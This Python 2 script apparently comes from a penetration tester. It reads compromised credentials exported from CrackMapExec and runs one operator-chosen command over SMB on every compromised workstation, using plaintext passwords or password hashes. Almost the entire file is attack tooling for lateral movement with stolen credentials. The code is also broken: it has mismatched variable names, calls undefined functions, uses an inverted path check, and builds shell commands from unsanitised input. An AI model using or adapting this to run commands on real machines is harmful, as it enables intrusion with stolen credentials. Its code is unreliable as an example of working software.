#!/usr/bin/python2

# Mass CrackMapExec command execution script
# v0.1 Utilizes all the compromised non-domain credentials to execute one command on their respective compromised computers and output them.
# The utilized method to execute command is smb on port 445

# Licensed under BSD 4 Clause License
# Copyleft @TanoyBose 2018

'''
Copyright (c) 2018 Tanoy Bose. All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
    2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
    3. All advertising materials mentioning features or use of this software must display the following acknowledgement:
    This product includes software developed by the organization.
    4. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY COPYRIGHT HOLDER "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL COPYRIGHT HOLDER BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'''

import os, subprocess, datetime

def cmeDomainUserCommandExec(cmeCred,currentTime,cmdExec):
    # Still to build this module
    pass


def cmeCommandExec(cmeCred,currentTime,cmdExec):
    cmdExecFilename=cmeCred[1]+"_"+currentTime+"_"+cmdExec+".txt"
    if (cmdCred[4]=="plaintext"):
        cmeExecCode="cme smb "+cmeCred[1]+" -u "+cmeCred[2]+" -p "+cmeCred[3]+" -x \""+cmdExec+"\""
    elif (cmeCred[4]=="hash"):
        cmdExecCode="cme smb "+cmeCred[1]+" -u "+cmeCred[2]+" -H "+cmeCred[3]+" -x \""+cmdExec+"\""
    else:
        pass
    print "Performing: "+cmeExecCode
    execStatus=os.system("timeout 90 "+cmeExecCode+" > "+cmeCred[1]+"/"+cmdExecFilename)
    if (not execStatus):
        print "[*] Command Executed Successfully!"
        print "[*] File Created Successfully!"

def executeEnumeration(cmecreds,cmdExec):
    #iterate through all hosts
    currentTimeDT=datetime.datetime.now()
    currentTime=currentTimeDT.strftime("%Y%m%d%H%M%S")
    for i in cmecreds:
        print "[*] Attempting hostname: ",i[1]
        # Check if directory present
        if (not (i[1].find("..") or i[1].find("/"))):
            print "Holy Shit! You almost deleted directories! Looks like you don't know what you are doing. Exiting!"
            exit(0)
        #directoryCreateStatus=os.system("mkdir "+i[1])
        # Run cmeIpConfig, cmeNetStat
        cmeIpconfigHost(i,currentTime)
        cmeNetstatHost(i,currentTime)
        cmdCommandExec(i,currentTime,cmdExec)

def loadCredsFromCme(cmeExportedFile,domainAlias,domainFqdn):
    print"Loading creds database"
    fp = open(cmeExportedFile,"rb")
    compromisedList = fp.readlines()
    fp.close()
    domainCompromisedCreds=[]
    weirdCompromisedCreds=[]
    workstationCompromisedCreds=[]

    for i in range(0,len(compromisedList)):
        eachLineInList = compromisedList[i].split(",")
        if (eachLineInList[1] == domainAlias):
            domainCompromisedCreds.append(eachLineInList)
        elif (eachLineInList[1] == domainFqdn):
            domainCompromisedCreds.append(eachLineInList)
        elif (eachLineInList[1] == ''):
            weirdCompromisedCreds.append(eachLineInList)
        else:
            workstationCompromisedCreds.append(eachLineInList)
    return domainCompromisedCreds,weirdCompromisedCreds,workstationCompromisedCreds

def main():
    domainFqdn = raw_input("Enter the FQDN: ")
    domainAlias = raw_input("Enter the alias: ")
    cmeExportedFile = raw_input("Enter the CMEDB Exported CSV filename: ")
    cmdExec = raw_input("Enter the command to be executed: ")
    domainCompromisedCreds,weirdCompromisedCreds,workstationCompromisedCreds=loadCredsFromCme(cmeExportedFile,domainAlias,domainFqdn)
    executeEnumeration(workstationCompromisedCreds,cmdExec)
    #print "\ndomain compromised: \n",domainCompromisedCreds
    #print "\nweird compromised: \n",weirdCompromisedCreds
    #print "\nworkstation compromised: \n",workstationCompromisedCreds

main()
